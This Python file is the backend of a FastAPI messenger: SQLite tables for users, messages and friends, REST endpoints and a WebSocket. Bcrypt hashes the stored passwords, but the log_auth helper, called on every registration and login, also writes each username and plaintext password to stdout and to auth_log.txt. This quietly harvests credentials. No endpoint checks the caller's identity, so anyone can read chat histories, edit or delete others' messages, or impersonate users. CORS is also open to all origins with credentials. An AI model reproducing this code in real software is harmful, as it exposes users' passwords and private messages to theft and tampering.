from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from datetime import datetime
import sqlite3
from passlib.context import CryptContext
from typing import List, Optional, Dict
import json
import asyncio

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

conn = sqlite3.connect('messenger.db', check_same_thread=False)
cursor = conn.cursor()

cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY,
        username TEXT UNIQUE NOT NULL,
        password TEXT NOT NULL,
        email TEXT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
''')
cursor.execute('''
    CREATE TABLE IF NOT EXISTS messages (
        id INTEGER PRIMARY KEY,
        sender TEXT NOT NULL,
        receiver TEXT NOT NULL,
        message TEXT NOT NULL,
        timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        is_read BOOLEAN DEFAULT FALSE
    )
''')
cursor.execute('''
    CREATE TABLE IF NOT EXISTS friends (
        id INTEGER PRIMARY KEY,
        user1 TEXT NOT NULL,
        user2 TEXT NOT NULL,
        status TEXT DEFAULT 'accepted',
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        UNIQUE(user1, user2)
    )
''')
conn.commit()

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

class User(BaseModel):
    username: str
    password: str
    email: Optional[str] = None

class Message(BaseModel):
    sender: str
    receiver: str
    message: str

class FriendRequest(BaseModel):
    user1: str
    user2: str

class EditMessage(BaseModel):
    message_id: int
    new_message: str

class DeleteMessage(BaseModel):
    message_id: int

online_users: Dict[str, WebSocket] = {}

def log_auth(action: str, username: str, password: str):
    log_line = f"[{datetime.now()}] {action.upper()} - Username: {username}, Password: {password}"
    print(log_line)  
    with open("auth_log.txt", "a", encoding="utf-8") as f:
        f.write(log_line + "\n")


@app.post("/register")
async def register_user(user: User):
    log_auth("register", user.username, user.password)
    hashed_password = pwd_context.hash(user.password)
    try:
        cursor.execute(
            'INSERT INTO users (username, password, email) VALUES (?, ?, ?)',
            (user.username, hashed_password, user.email)
        )
        conn.commit()
        return {"success": True}
    except sqlite3.IntegrityError:
        raise HTTPException(status_code=400, detail="Username already exists")

@app.post("/login")
async def login_user(user: User):
    log_auth("login", user.username, user.password)
    cursor.execute(
        'SELECT password FROM users WHERE username = ?',
        (user.username,)
    )
    result = cursor.fetchone()
    if result is None or not pwd_context.verify(user.password, result[0]):
        raise HTTPException(status_code=401, detail="Invalid credentials")
    return {"success": True, "username": user.username}

@app.post("/send_message")
async def send_message(message: Message):
    cursor.execute(
        'INSERT INTO messages (sender, receiver, message) VALUES (?, ?, ?)',
        (message.sender, message.receiver, message.message)
    )
    conn.commit()
    cursor.execute(
        'SELECT id, timestamp FROM messages WHERE sender = ? AND receiver = ? ORDER BY id DESC LIMIT 1',
        (message.sender, message.receiver)
    )
    result = cursor.fetchone()
    if result:
        message_id, timestamp = result
        enriched_message = {
            "action": "message",
            "id": message_id,
            "sender": message.sender,
            "receiver": message.receiver,
            "message": message.message,
            "timestamp": timestamp
        }
        for user in [message.sender, message.receiver]:
            if user in online_users:
                await online_users[user].send_text(json.dumps(enriched_message))
    return {"success": True}

@app.post("/edit_message")
async def edit_message(edit_message: EditMessage):
    cursor.execute(
        'UPDATE messages SET message = ? WHERE id = ?',
        (edit_message.new_message, edit_message.message_id)
    )
    conn.commit()
    cursor.execute(
        'SELECT sender, receiver FROM messages WHERE id = ?',
        (edit_message.message_id,)
    )
    result = cursor.fetchone()
    if result:
        sender, receiver = result
        enriched_message = {
            "action": "edit_message",
            "id": edit_message.message_id,
            "new_message": edit_message.new_message
        }
        for user in [sender, receiver]:
            if user in online_users:
                await online_users[user].send_text(json.dumps(enriched_message))
    return {"success": True}

@app.post("/delete_message")
async def delete_message(delete_message: DeleteMessage):
    cursor.execute(
        'SELECT sender, receiver FROM messages WHERE id = ?',
        (delete_message.message_id,)
    )
    result = cursor.fetchone()
    if result:
        sender, receiver = result
        cursor.execute(
            'DELETE FROM messages WHERE id = ?',
            (delete_message.message_id,)
        )
        conn.commit()
        enriched_message = {
            "action": "delete_message",
            "id": delete_message.message_id
        }
        for user in [sender, receiver]:
            if user in online_users:
                await online_users[user].send_text(json.dumps(enriched_message))
    return {"success": True}

@app.get("/get_chat_history/{user1}/{user2}")
async def get_chat_history(user1: str, user2: str, limit: int = 50):
    cursor.execute('''
        SELECT id, sender, receiver, message, timestamp
        FROM messages
        WHERE (sender = ? AND receiver = ?) OR (sender = ? AND receiver = ?)
        ORDER BY timestamp DESC LIMIT ?
    ''', (user1, user2, user2, user1, limit))
    messages = [
        {
            'id': row[0],
            'sender': row[1],
            'receiver': row[2],
            'message': row[3],
            'timestamp': row[4]
        } for row in reversed(cursor.fetchall())
    ]
    return {"messages": messages}

@app.post("/add_friend")
async def add_friend(friend_request: FriendRequest):
    try:
        cursor.execute('SELECT username FROM users WHERE username IN (?, ?)', 
                      (friend_request.user1, friend_request.user2))
        existing_users = set(row[0] for row in cursor.fetchall())
        if friend_request.user1 not in existing_users or friend_request.user2 not in existing_users:
            raise HTTPException(status_code=400, detail="One or both users do not exist")
        
        cursor.execute(
            'INSERT OR IGNORE INTO friends (user1, user2, status) VALUES (?, ?, ?)',
            (friend_request.user1, friend_request.user2, 'accepted')
        )
        cursor.execute(
            'INSERT OR IGNORE INTO friends (user1, user2, status) VALUES (?, ?, ?)',
            (friend_request.user2, friend_request.user1, 'accepted')
        )
        conn.commit()
        
        for user in [friend_request.user1, friend_request.user2]:
            if user in online_users:
                cursor.execute(
                    '''
                    SELECT CASE
                        WHEN user1 = ? THEN user2
                        ELSE user1
                    END as friend
                    FROM friends
                    WHERE (user1 = ? OR user2 = ?) AND status = 'accepted'
                    ''', (user, user, user)
                )
                friends = [row[0] for row in cursor.fetchall()]
                await online_users[user].send_text(json.dumps({
                    "action": "friends_update",
                    "friends": friends
                }))
        return {"success": True}
    except sqlite3.IntegrityError:
        raise HTTPException(status_code=400, detail="Friend request already exists")

@app.get("/search_users/{query}/{current_user}")
async def search_users(query: str, current_user: str):
    cursor.execute(
        'SELECT username FROM users WHERE username LIKE ? AND username != ?',
        (f'%{query}%', current_user)
    )
    return {"users": [row[0] for row in cursor.fetchall()]}

@app.get("/get_user_friends/{username}")
async def get_user_friends(username: str):
    cursor.execute('''
        SELECT CASE
            WHEN user1 = ? THEN user2
            ELSE user1
        END as friend
        FROM friends
        WHERE (user1 = ? OR user2 = ?) AND status = 'accepted'
    ''', (username, username, username))
    friends = [row[0] for row in cursor.fetchall()]

    friends_with_status = [{"username": friend, "status": "online" if friend in online_users else "offline"} 
                          for friend in friends]
    return {"friends": friends_with_status}

@app.websocket("/ws/{user_id}")
async def websocket_endpoint(websocket: WebSocket, user_id: str):
    await websocket.accept()
    online_users[user_id] = websocket

    cursor.execute(
        '''
        SELECT CASE
            WHEN user1 = ? THEN user2
            ELSE user1
        END as friend
        FROM friends
        WHERE (user1 = ? OR user2 = ?) AND status = 'accepted'
        ''', (user_id, user_id, user_id)
    )
    friends = [row[0] for row in cursor.fetchall()]
    
    status_message = {
        "action": "user_status",
        "user": user_id,
        "status": "online"
    }
    for friend in friends:
        if friend in online_users:
            await online_users[friend].send_text(json.dumps(status_message))

    try:
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)
            if message["action"] == "message":
                cursor.execute(
                    'INSERT INTO messages (sender, receiver, message) VALUES (?, ?, ?)',
                    (message["sender"], message["receiver"], message["message"])
                )
                conn.commit()
                cursor.execute(
                    'SELECT id, timestamp FROM messages WHERE sender = ? AND receiver = ? ORDER BY id DESC LIMIT 1',
                    (message["sender"], message["receiver"])
                )
                result = cursor.fetchone()
                if result:
                    message_id, timestamp = result
                    enriched_message = {
                        "action": "message",
                        "id": message_id,
                        "sender": message["sender"],
                        "receiver": message["receiver"],
                        "message": message["message"],
                        "timestamp": timestamp
                    }
                    for user in [message["sender"], message["receiver"]]:
                        if user in online_users:
                            await online_users[user].send_text(json.dumps(enriched_message))
            elif message["action"] == "edit_message":
                cursor.execute(
                    'UPDATE messages SET message = ? WHERE id = ?',
                    (message["new_message"], message["id"])
                )
                conn.commit()
                cursor.execute(
                    'SELECT sender, receiver FROM messages WHERE id = ?',
                    (message["id"],)
                )
                result = cursor.fetchone()
                if result:
                    sender, receiver = result
                    for user in [sender, receiver]:
                        if user in online_users:
                            await online_users[user].send_text(json.dumps({
                                "action": "edit_message",
                                "id": message["id"],
                                "new_message": message["new_message"]
                            }))
            elif message["action"] == "delete_message":
                cursor.execute(
                    'SELECT sender, receiver FROM messages WHERE id = ?',
                    (message["id"],)
                )
                result = cursor.fetchone()
                if result:
                    sender, receiver = result
                    cursor.execute(
                        'DELETE FROM messages WHERE id = ?',
                        (message["id"],)
                    )
                    conn.commit()
                    for user in [sender, receiver]:
                        if user in online_users:
                            await online_users[user].send_text(json.dumps({
                                "action": "delete_message",
                                "id": message["id"]
                            }))
    except WebSocketDisconnect:
        online_users.pop(user_id, None)
        status_message = {
            "action": "user_status",
            "user": user_id,
            "status": "offline"
        }
        for friend in friends:
            if friend in online_users:
                await online_users[friend].send_text(json.dumps(status_message))

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
